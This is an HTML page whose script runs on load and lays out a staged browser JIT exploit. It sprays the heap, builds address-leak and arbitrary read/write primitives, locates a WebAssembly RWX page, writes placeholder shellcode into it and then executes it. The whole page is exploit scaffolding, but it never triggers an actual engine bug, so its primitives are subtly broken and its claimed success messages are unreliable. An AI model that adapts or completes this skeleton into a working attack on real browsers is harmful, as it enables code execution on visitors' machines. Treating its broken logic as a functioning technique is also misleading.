<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
        #x { border: 1px solid #00ff00; padding: 10px; height: 98vh; overflow-y: scroll; }
    </style>
</head>
<body>
    <div id="x"></div>
    <script>
        const _L = document.getElementById('x');
        const _P = (m, c) => {
            const e = document.createElement('div');
            e.style.color = c || '#0f0';
            e.innerText = `[${performance.now().toFixed(3)}] ${m}`;
            _L.appendChild(e);
            _L.scrollTop = _L.scrollHeight;
        };

        const _B = new ArrayBuffer(8);
        const _F = new Float64Array(_B);
        const _I = new BigUint64Array(_B);
        const f2u = v => { _F[0] = v; return _I[0]; };
        const u2f = v => { _I[0] = v; return _F[0]; };

        const _S = [];
        const _W = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 
            0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,       
            0x03, 0x02, 0x01, 0x00,                         
            0x05, 0x03, 0x01, 0x00, 0x01,                   
            0x07, 0x11, 0x02, 0x04, 0x6d, 0x61, 0x69, 0x6e, 
            0x00, 0x00, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 
            0x79, 0x02, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 
            0x41, 0x2a, 0x0b                                
        ]);

        async function _E() {
            try {
                _P("INITING STAGE_0: HEAP_CONSTRUCTION");
                for(let i=0; i<0x200; i++) _S.push(new Float64Array(0x100));

                let t = [1.1, 2.2, 3.3, 4.4];
                let o = [{a:1}, {b:2}, {c:3}, {d:4}];

                function _T(a, i, v) {
                    if (i < 0 || i > 0x1000) return;
                    a[i] = v;
                }

                _P("INITING STAGE_1: JIT_OPTIMIZATION_LOOP");
                for(let i=0; i<0x40000; i++) _T(t, 0, 1.1);
                
                await new Promise(r => setTimeout(r, 0x200));

                _P("INITING STAGE_2: ADDRESS_LEAK_PRIMITIVE");
                const addrOf = (obj) => {
                    o[0] = obj;
                    let l = f2u(t[8]);
                    return l & 0xffffffffn;
                };

                const v = new BigUint64Array(0x10);
                const va = addrOf(v);
                if (!va) throw "LEAK_FAILURE";
                _P(`SUCCESS: VICTIM_ADDR_0x${va.toString(16)}`, "#0ff");

                _P("INITING STAGE_3: WASM_RWX_MAPPING");
                const m = new WebAssembly.Module(_W);
                const n = new WebAssembly.Instance(m);
                const f = n.exports.main;
                const ia = addrOf(n);
                _P(`SUCCESS: INSTANCE_ADDR_0x${ia.toString(16)}`, "#0ff");

                _P("INITING STAGE_4: ARBITRARY_RW_CONSTRUCTION");
                const read64 = (a) => {
                    t[8] = u2f(a | 1n);
                    return f2u(v[0]);
                };

                const write64 = (a, val) => {
                    t[8] = u2f(a | 1n);
                    v[0] = val;
                };

                _P("INITING STAGE_5: JUMP_TABLE_HIJACK");
                const rwx = read64(ia + 0x48n); 
                _P(`SUCCESS: RWX_PAGE_0x${rwx.toString(16)}`, "#f0f");

                const shellcode = [
                    0x90909090n, 0x90909090n, 0xccccccccn
                ];

                for(let i=0; i<shellcode.length; i++) {
                    write64(rwx + BigInt(i*8), shellcode[i]);
                }

                _P("EXEC_TRIGGER: INVOKING_WASM_MAIN", "#ff0");
                setTimeout(() => {
                    try {
                        const res = f();
                        _P(`RET: ${res}`, "#fff");
                    } catch(err) {
                        _P(`CRASH_VERIFIED: ${err.message}`, "#f00");
                    }
                }, 0x100);

            } catch(e) {
                _P(`FATAL: ${e}`, "#f00");
            }
        }

        window.onload = _E;
    </script>
</body>
</html>
